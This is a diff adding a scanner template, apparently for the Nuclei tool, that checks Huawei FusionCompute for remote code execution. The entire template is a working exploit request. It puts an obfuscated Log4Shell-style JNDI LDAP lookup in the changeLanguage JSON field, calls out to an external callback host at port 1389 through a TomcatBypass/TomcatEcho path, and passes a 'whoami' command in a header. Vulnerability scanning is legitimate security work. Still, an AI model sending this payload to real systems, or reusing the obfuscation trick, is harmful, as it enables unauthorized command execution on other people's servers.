@@ -1,0 +1,29 @@
+id: huawei-fusioncompute-rce
+
+info:
+  name: huawei-fusioncompute-rce
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /service/login/changeLanguage HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0a
+        Accept: application/json;version=8.0;charset=UTF-8
+        Accept-Language: en
+        Content-Type: application/json; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip
+        cmd: whoami
+
+        {"languageInfo":"${:-y$}{${h3o:-j}nd${env:sgd:-}i:l${y26::-d}ap://{{interactsh-url}}:1389/TomcatBypass/TomcatEcho}"}
+    
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
